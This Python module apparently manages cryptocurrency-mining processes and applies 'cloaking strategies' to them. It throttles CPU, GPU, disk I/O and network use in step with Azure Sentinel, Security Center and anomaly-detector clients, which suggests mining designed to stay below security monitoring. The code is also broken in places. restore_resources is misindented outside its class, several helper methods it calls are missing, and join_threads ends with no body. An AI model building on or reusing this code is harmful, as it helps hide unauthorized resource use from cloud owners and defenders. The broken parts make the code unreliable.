# resource_manager.py

import os
import logging
import subprocess
import psutil
import pynvml
from time import sleep, time
from pathlib import Path
from queue import PriorityQueue, Empty, Queue
from threading import Event, Thread, Lock
from typing import List, Any, Dict, Optional
from readerwriterlock import rwlock

from .base_manager import BaseManager
from .utils import MiningProcess
from .cloak_strategies import CloakStrategyFactory

from .azure_clients import (
    AzureMonitorClient,
    AzureSentinelClient,
    AzureLogAnalyticsClient,
    AzureSecurityCenterClient,
    AzureNetworkWatcherClient,
    AzureTrafficAnalyticsClient,
    AzureMLClient,
    AzureAnomalyDetectorClient,  # Add new client
    AzureOpenAIClient            # Add new client
)

from .auxiliary_modules import temperature_monitor

from .auxiliary_modules.power_management import (
    get_cpu_power,
    get_gpu_power,
    set_gpu_usage,
    shutdown_power_management
)


def assign_process_resources(pid: int, resources: Dict[str, Any], process_name: str, logger: logging.Logger):
    """
    Replacement function for assign_process_to_cgroups, applies resource adjustments through
    system mechanisms or logs warnings if equivalent adjustments cannot be applied.

    Args:
        pid (int): PID of the process to adjust.
        resources (Dict[str, Any]): Dictionary containing adjustment parameters, e.g.:
            {
                'cpu_threads': int,
                'memory': int (MB),
                'cpu_freq': int (MHz),
                'disk_io_limit_mbps': float,
                ...
            }
        process_name (str): Process name.
        logger (logging.Logger): Logger for logging.
    """

    # Adjust CPU threads using taskset (Linux)
    if 'cpu_threads' in resources:
        try:
            cpu_count = psutil.cpu_count(logical=True)
            desired_threads = resources['cpu_threads']
            if desired_threads > cpu_count or desired_threads <= 0:
                logger.warning(f"Requested CPU threads ({desired_threads}) invalid. Skipping.")
            else:
                # Get CPU cores list from 0 to desired_threads-1
                cores = ",".join(map(str, range(desired_threads)))
                subprocess.run(['taskset', '-cp', cores, str(pid)], check=True)
                logger.info(f"Applied {desired_threads} CPU threads limit for process {process_name} (PID: {pid}).")
        except Exception as e:
            logger.error(f"Error adjusting CPU threads using taskset for {process_name} (PID: {pid}): {e}")

    # RAM allocation adjustment: No cgroup, log only
    if 'memory' in resources:
        logger.warning(f"Cannot limit RAM for process {process_name} (PID: {pid}) without cgroup_manager. Skipping.")

    # CPU frequency adjustment: No cgroup, log only
    if 'cpu_freq' in resources:
        logger.warning(f"Cannot directly adjust CPU frequency for process {process_name} (PID: {pid}) without using cgroup. Skipping.")

    # Disk I/O limit adjustment: No cgroup, log only
    if 'disk_io_limit_mbps' in resources:
        logger.warning(f"Cannot directly adjust Disk I/O for process {process_name} (PID: {pid}) without using cgroup. Skipping.")


class SharedResourceManager:
    """
    Class containing shared resource adjustment functions.
    """

    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        self.config = config
        self.logger = logger
        self.original_resource_limits = {}

    def adjust_cpu_threads(self, pid: int, cpu_threads: int, process_name: str):
        """Adjust CPU threads."""
        try:
            assign_process_resources(pid, {'cpu_threads': cpu_threads}, process_name, self.logger)
            self.logger.info(f"Adjusted CPU threads to {cpu_threads} for process {process_name} (PID: {pid}).")
        except Exception as e:
            self.logger.error(f"Error adjusting CPU threads for process {process_name} (PID: {pid}): {e}")

    def adjust_ram_allocation(self, pid: int, ram_allocation_mb: int, process_name: str):
        """Adjust RAM limit."""
        try:
            assign_process_resources(pid, {'memory': ram_allocation_mb}, process_name, self.logger)
            self.logger.info(f"Adjusted RAM limit to {ram_allocation_mb}MB for process {process_name} (PID: {pid}).")
        except Exception as e:
            self.logger.error(f"Error adjusting RAM for process {process_name} (PID: {pid}): {e}")

    def adjust_gpu_usage(self, process: MiningProcess, gpu_usage_percent: List[float]):
        """Adjust GPU usage."""
        try:
            new_gpu_usage_percent = [
                min(max(gpu + self.config["optimization_parameters"].get("gpu_power_adjustment_step", 10), 0), 100)
                for gpu in gpu_usage_percent
            ]
            set_gpu_usage(process.pid, new_gpu_usage_percent)
            self.logger.info(f"Adjusted GPU usage to {new_gpu_usage_percent} for process {process.name} (PID: {process.pid}).")
        except Exception as e:
            self.logger.error(f"Error adjusting GPU usage for process {process.name} (PID: {process.pid}): {e}")

    def adjust_disk_io_limit(self, process: MiningProcess, disk_io_limit_mbps: float):
        """Adjust Disk I/O limit for process."""
        try:
            current_limit = temperature_monitor.get_current_disk_io_limit(process.pid)
            adjustment_step = self.config["optimization_parameters"].get("disk_io_limit_step_mbps", 1)
            if current_limit > disk_io_limit_mbps:
                new_limit = current_limit - adjustment_step
            else:
                new_limit = current_limit + adjustment_step
            new_limit = max(
                self.config["resource_allocation"]["disk_io"]["min_limit_mbps"],
                min(new_limit, self.config["resource_allocation"]["disk_io"]["max_limit_mbps"])
            )
            assign_process_resources(process.pid, {'disk_io_limit_mbps': new_limit}, process.name, self.logger)
            self.logger.info(f"Adjusted Disk I/O limit to {new_limit} Mbps for process {process.name} (PID: {process.pid}).")
        except Exception as e:
            self.logger.error(f"Error adjusting Disk I/O for process {process.name} (PID: {process.pid}): {e}")

    def adjust_network_bandwidth(self, process: MiningProcess, bandwidth_limit_mbps: float):
        """Adjust network bandwidth for process."""
        try:
            self.apply_network_cloaking(process.network_interface, bandwidth_limit_mbps, process)
            self.logger.info(f"Adjusted network bandwidth limit to {bandwidth_limit_mbps} Mbps for process {process.name} (PID: {process.pid}).")
        except Exception as e:
            self.logger.error(f"Error adjusting Network for process {process.name} (PID: {process.pid}): {e}")

    def adjust_cpu_frequency(self, pid: int, frequency: int, process_name: str):
        """Adjust CPU frequency."""
        try:
            assign_process_resources(pid, {'cpu_freq': frequency}, process_name, self.logger)
            self.logger.info(f"Set CPU frequency to {frequency}MHz for process {process_name} (PID: {pid}).")
        except Exception as e:
            self.logger.error(f"Error adjusting CPU frequency for process {process_name} (PID: {pid}): {e}")

    def adjust_gpu_power_limit(self, pid: int, power_limit: int, process_name: str):
        """Adjust GPU power limit."""
        try:
            pynvml.nvmlInit()
            handle = pynvml.nvmlDeviceGetHandleByIndex(0)  # Assume single GPU
            pynvml.nvmlDeviceSetPowerManagementLimit(handle, power_limit * 1000)
            pynvml.nvmlShutdown()
            self.logger.info(f"Set GPU power limit to {power_limit}W for process {process_name} (PID: {pid}).")
        except Exception as e:
            self.logger.error(f"Error adjusting GPU power for process {process_name} (PID: {pid}): {e}")

    def adjust_disk_io_priority(self, pid: int, ionice_class: int, process_name: str):
        """Adjust Disk I/O priority."""
        try:
            subprocess.run(['ionice', '-c', str(ionice_class), '-p', str(pid)], check=True)
            self.logger.info(f"Set ionice class to {ionice_class} for process {process_name} (PID: {pid}).")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Error executing ionice: {e}")
        except Exception as e:
            self.logger.error(f"Error adjusting Disk I/O priority for process {process_name} (PID: {pid}): {e}")

    def drop_caches(self):
        """Reduce cache usage by drop_caches."""
        try:
            with open('/proc/sys/vm/drop_caches', 'w') as f:
                f.write('3\n')
            self.logger.info("Reduced cache usage using drop_caches.")
        except Exception as e:
            self.logger.error(f"Error reducing cache usage: {e}")

    def apply_network_cloaking(self, interface: str, bandwidth_limit: float, process: MiningProcess):
        """Apply network cloaking for process."""
        try:
            self.configure_network_interface(interface, bandwidth_limit)
        except Exception as e:
            self.logger.error(f"Error applying network cloaking for process {process.name} (PID: {process.pid}): {e}")
            raise

    def configure_network_interface(self, interface: str, bandwidth_limit: float):
        """Configure network interface (e.g., using tc)."""
        # Place to insert actual QoS/TC configuration logic if needed.
        pass

    def throttle_cpu_based_on_load(self, process: MiningProcess, load_percent: float):
        """Throttle CPU based on load."""
        try:
            if load_percent > 80:
                new_freq = 2000  # MHz
            elif load_percent > 50:
                new_freq = 2500  # MHz
            else:
                new_freq = 3000  # MHz
            self.adjust_cpu_frequency(process.pid, new_freq, process.name)
            self.logger.info(f"Adjusted CPU frequency to {new_freq}MHz for process {process.name} (PID: {process.pid}) based on load {load_percent}%.")
        except Exception as e:
            self.logger.error(f"Error adjusting CPU frequency based on load for process {process.name} (PID: {process.pid}): {e}")

    def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
        """
        Apply a specific cloaking strategy to the process and save initial resource state.
        """
        try:
            self.logger.debug(f"Creating strategy {strategy_name} for process {process.name} (PID: {process.pid})")
            strategy = CloakStrategyFactory.create_strategy(strategy_name, self.config, self.logger, self.is_gpu_initialized())
        except Exception as e:
            self.logger.error(f"Cannot create strategy {strategy_name}: {e}")
            raise

        if strategy:
            try:
                adjustments = strategy.apply(process)
                if adjustments:
                    self.logger.info(f"Applying {strategy_name} adjustments for process {process.name} (PID: {process.pid}): {adjustments}")

                    pid = process.pid
                    if pid not in self.original_resource_limits:
                        self.original_resource_limits[pid] = {}

                    for key, value in adjustments.items():
                        if key == 'cpu_freq':
                            original_freq = self.get_current_cpu_frequency(pid)
                            self.original_resource_limits[pid]['cpu_freq'] = original_freq
                        elif key == 'gpu_power_limit':
                            original_power_limit = self.get_current_gpu_power_limit(pid)
                            self.original_resource_limits[pid]['gpu_power_limit'] = original_power_limit
                        elif key == 'network_bandwidth_limit_mbps':
                            original_bw_limit = self.get_current_network_bandwidth_limit(pid)
                            self.original_resource_limits[pid]['network_bandwidth_limit_mbps'] = original_bw_limit
                        elif key == 'ionice_class':
                            original_ionice_class = self.get_current_ionice_class(pid)
                            self.original_resource_limits[pid]['ionice_class'] = original_ionice_class
                        # ... Save other limits similarly

                    self.execute_adjustments(adjustments, process)
                else:
                    self.logger.warning(f"No adjustments applied for strategy {strategy_name} for process {process.name} (PID: {process.pid}).")
            except Exception as e:
                self.logger.error(f"Error applying cloaking strategy {strategy_name} for process {process.name} (PID: {process.pid}): {e}")
                raise
        else:
            warning_message = f"Cloaking strategy {strategy_name} was not created successfully for process {process.name} (PID: {process.pid})."
            self.logger.warning(warning_message)
            raise RuntimeError(warning_message)
def restore_resources(self, process: MiningProcess):
    """
    Restore resources for the process after confirming safety from AnomalyDetector.
    """
    try:
        pid = process.pid
        process_name = process.name
        original_limits = self.original_resource_limits.get(pid)
        if not original_limits:
            self.logger.warning(f"Original resource limits not found for process {process_name} (PID: {pid}).")
            return

        cpu_freq = original_limits.get('cpu_freq')
        if cpu_freq:
            self.adjust_cpu_frequency(pid, cpu_freq, process_name)
            self.logger.info(f"Restored CPU frequency to {cpu_freq}MHz for process {process_name} (PID: {pid}).")

        cpu_threads = original_limits.get('cpu_threads')
        if cpu_threads:
            self.adjust_cpu_threads(pid, cpu_threads, process_name)
            self.logger.info(f"Restored CPU threads to {cpu_threads} for process {process_name} (PID: {pid}).")

        ram_allocation_mb = original_limits.get('ram_allocation_mb')
        if ram_allocation_mb:
            self.adjust_ram_allocation(pid, ram_allocation_mb, process_name)
            self.logger.info(f"Restored RAM limit to {ram_allocation_mb}MB for process {process_name} (PID: {pid}).")

        gpu_power_limit = original_limits.get('gpu_power_limit')
        if gpu_power_limit:
            self.adjust_gpu_power_limit(pid, gpu_power_limit, process_name)
            self.logger.info(f"Restored GPU power limit to {gpu_power_limit}W for process {process_name} (PID: {pid}).")

        ionice_class = original_limits.get('ionice_class')
        if ionice_class:
            self.adjust_disk_io_priority(pid, ionice_class, process_name)
            self.logger.info(f"Restored ionice class to {ionice_class} for process {process_name} (PID: {pid}).")

        network_bandwidth_limit_mbps = original_limits.get('network_bandwidth_limit_mbps')
        if network_bandwidth_limit_mbps:
            self.adjust_network_bandwidth(process, network_bandwidth_limit_mbps)
            self.logger.info(f"Restored network bandwidth limit to {network_bandwidth_limit_mbps} Mbps for process {process_name} (PID: {pid}).")

        del self.original_resource_limits[pid]
        self.logger.info(f"Restored all resources for process {process_name} (PID: {pid}).")

    except Exception as e:
        self.logger.error(f"Error while restoring resources for process {process.name} (PID: {process.pid}): {e}")
        raise


class ResourceManager(BaseManager):
    """
    System resource management and adjustment class, including dynamic load distribution.
    Inherits from BaseManager to use common methods.
    """
    _instance = None
    _instance_lock = Lock()

    def __new__(cls, *args, **kwargs):
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = super(ResourceManager, cls).__new__(cls)
        return cls._instance

    def __init__(self, config: Dict[str, Any], model_path: Path, logger: logging.Logger):
        super().__init__(config, logger)
        if hasattr(self, '_initialized') and self._initialized:
            return
        self._initialized = True

        self.config = config
        self.model_path = model_path
        self.logger = logger

        # Event to stop threads
        self.stop_event = Event()

        # Read-Write Lock for resource synchronization
        self.resource_lock = rwlock.RWLockFair()

        # Priority queue for sending resource adjustment requests
        self.resource_adjustment_queue = PriorityQueue()

        # Queue for receiving cloaking requests from AnomalyDetector
        self.cloaking_request_queue = Queue()

        # List of mining processes
        self.mining_processes = []
        self.mining_processes_lock = rwlock.RWLockFair()

        # Initialize Azure clients
        self.initialize_azure_clients()

        # Discover Azure resources
        self.discover_azure_resources()

        # Initialize resource management threads
        self.initialize_threads()

        # Initialize SharedResourceManager
        self.shared_resource_manager = SharedResourceManager(config, logger)

    def start(self):
        """Start ResourceManager and resource management threads."""
        self.logger.info("Starting ResourceManager...")
        self.discover_mining_processes()
        self.start_threads()
        self.logger.info("ResourceManager started successfully.")

    def stop(self):
        """Stop ResourceManager and release resources."""
        self.logger.info("Stopping ResourceManager...")
        self.stop_event.set()
        self.join_threads()
        self.shutdown_power_management()
        self.logger.info("ResourceManager stopped successfully.")

    def initialize_threads(self):
        """Initialize resource management threads."""
        self.monitor_thread = Thread(target=self.monitor_and_adjust, name="MonitorThread", daemon=True)
        self.optimization_thread = Thread(target=self.optimize_resources, name="OptimizationThread", daemon=True)
        self.cloaking_thread = Thread(target=self.process_cloaking_requests, name="CloakingThread", daemon=True)
        self.resource_adjustment_thread = Thread(target=self.resource_adjustment_handler, name="ResourceAdjustmentThread", daemon=True)

    def start_threads(self):
        """Start resource management threads."""
        self.monitor_thread.start()
        self.optimization_thread.start()
        self.cloaking_thread.start()
        self.resource_adjustment_thread.start()

    def join_threads(self):
        """Wait for threads to complete."""
